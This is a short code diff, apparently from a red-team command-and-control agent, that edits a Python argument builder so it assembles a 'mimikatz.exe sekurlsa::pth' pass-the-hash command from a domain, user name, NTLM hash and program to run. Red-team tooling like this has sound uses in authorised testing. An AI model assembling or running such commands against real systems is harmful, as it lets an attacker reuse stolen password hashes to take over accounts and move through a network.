@@ -125,7 +125,7 @@ class PthArguments(TaskArguments):
                 domain = self.get_arg("domain")
                 ntlm = self.get_arg("ntlm")
 
-            cmd = "/domain:{} /user:{} /ntlm:{}".format(
+            cmd = "sekurlsa::pth /domain:{} /user:{} /ntlm:{}".format(
                 domain,
                 username,
                 ntlm
@@ -138,7 +138,7 @@ class PthArguments(TaskArguments):
                 if " " in run:
                     run = "\'{}\'".format(run)
                 cmd += " /run:{}".format(run)
-            cmd = "\"{}\"".format(cmd)
+            cmd = "\\\"{}\\\"".format(cmd)
 
             self.add_arg("command", "mimikatz.exe {}".format(cmd))
         else:
